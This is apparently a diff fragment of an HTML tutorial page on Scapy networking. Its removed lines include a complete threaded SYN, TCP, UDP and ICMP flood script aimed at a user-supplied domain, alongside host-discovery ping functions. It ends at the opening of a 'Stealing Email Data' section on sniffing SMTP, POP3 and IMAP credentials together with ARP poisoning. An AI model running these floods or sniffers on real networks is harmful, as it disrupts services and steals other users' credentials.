-    &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;udpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;udp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;udp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;icmpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;icmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ICMP&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
-    &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;icmp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-            &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;synFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-            &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;tcpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-            &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;udpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-            &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;icmpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Option not valid.&amp;quot;&lt;/span&gt;
-        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getIP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;domainName&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gethostbyname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;domainName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="n"&gt;domainName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Type the domain name: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Type the port: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;op&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Select the flood attack type: 1) syn, 2) tcp, 3)udp, 4) icmp &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Select the count: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getIP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;domainName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;op&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;Pinging the Network&lt;/h3&gt;
-&lt;p&gt;We can perform  &lt;strong&gt;ping&lt;/strong&gt; operations with several protocols using Scapy. The fastest way to discover hosts on a local Ethernet network is to use ARP:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;arp_ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;srp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Ether&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ff:ff:ff:ff:ff:ff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ARP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pdst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%E&lt;/span&gt;&lt;span class="s"&gt;ther.src&lt;/span&gt;&lt;span class="si"&gt;% %&lt;/span&gt;&lt;span class="s"&gt;ARP.psrc%&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;In other cases we can use ICMP ping:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;icmp_ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ICMP&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%IP.src&lt;/span&gt;&lt;span class="si"&gt;% i&lt;/span&gt;&lt;span class="s"&gt;s alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;In case when  ICMP echo requests are blocked, we can still use TCP:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;tcp_ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%IP.src&lt;/span&gt;&lt;span class="si"&gt;% i&lt;/span&gt;&lt;span class="s"&gt;s alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Or even  UDP  (which produces ICMP port unreachable errors from live hosts). We can pick any port which is most likely to be closed,  such as port 0:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;udp_ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;UDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%IP.src&lt;/span&gt;&lt;span class="si"&gt;% i&lt;/span&gt;&lt;span class="s"&gt;s alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
 &lt;h3&gt;More Networking&lt;/h3&gt;
-&lt;p&gt;Scapy can perform simple networking functions such as  &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute-2"&gt;traceroute&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;Scapy can perform simple networking functions such as  &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute-2"&gt;traceroute&lt;/a&gt; or &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-in-a-loop"&gt;ping&lt;/a&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;scapy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;traceroute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;www.google.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -419,8 +337,8 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Scapy also has  commands for network-based attack such as &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute"&gt;arpcachepoison  and srpflood&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Additionally, we can use Scapy to re-create a packet that has been sniffed or received. The method &lt;strong&gt;command()&lt;/strong&gt; returns a string of the commands necessary for this task. Its output is similar to the command &lt;strong&gt;show()&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Scapy has also commands for network-based attack such as &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute"&gt;arpcachepoison  and srpflood&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Additionally, we can use Scapy to re-create a packet that has been sniffed or received. The method &lt;strong&gt;command()&lt;/strong&gt; returns a string of the commands necessary for this task.&lt;/p&gt;
 &lt;h3&gt;Plotting&lt;/h3&gt;
 &lt;p&gt;If you have &lt;a href="http://www.gnuplot.info/"&gt;GnuPlot&lt;/a&gt; installed, you can use the plot functionality with Scapy. It's pretty neat.&lt;/p&gt;
 &lt;p&gt;We also can plot  graphs with the function &lt;strong&gt;plot()&lt;/strong&gt; and &lt;strong&gt;graph()&lt;/strong&gt;,  and we can generate 3D  plots with &lt;strong&gt;trace3D()&lt;/strong&gt;.&lt;/p&gt;
@@ -439,41 +357,53 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 
 &lt;hr /&gt;
 &lt;h2&gt;&lt;a name="email"&gt;&lt;/a&gt; Stealing Email Data&lt;/h2&gt;
-&lt;p&gt;The idea of this script is to build a sniffer to capture &lt;a href="http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"&gt;SMTP&lt;/a&gt;, &lt;a href="http://en.wikipedia.org/wiki/Post_Office_Protocol"&gt;POP3&lt;/a&gt;, and &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;IMAP&lt;/a&gt; credentials. Once we couple this sniffer with some &lt;a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack"&gt;MITM&lt;/a&gt; attack (such as &lt;strong&gt;ARP poisoning&lt;/strong&gt;), we can steal credentials from other machines in the network.&lt;/p&gt;
+&lt;p&gt;The idea of this script is to build a sniffer to capture &lt;a href="http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"&gt;SMTP&lt;/a&gt;, &lt;a href="http://en.wikipedia.org/wiki/Post_Office_Protocol"&gt;POP3&lt;/a&gt;, and &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;IMAP&lt;/a&gt; credentials. Once we couple this sniffer with some &lt;a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack"&gt;MITM&lt;/a&gt; attack (such as **ARP poisoning), we can steal credentials from other machines in the network.&lt;/p&gt;
 &lt;p&gt;With this in mind, we write a script that runs a sniffer on all the interfaces, with no filtering. The &lt;strong&gt;sniff&lt;/strong&gt;'s &lt;strong&gt;store=0&lt;/strong&gt; attribute ensures that the packets are not kept in memory (so we can leave it running):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="c"&gt;# check to make sure it has a data payload&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
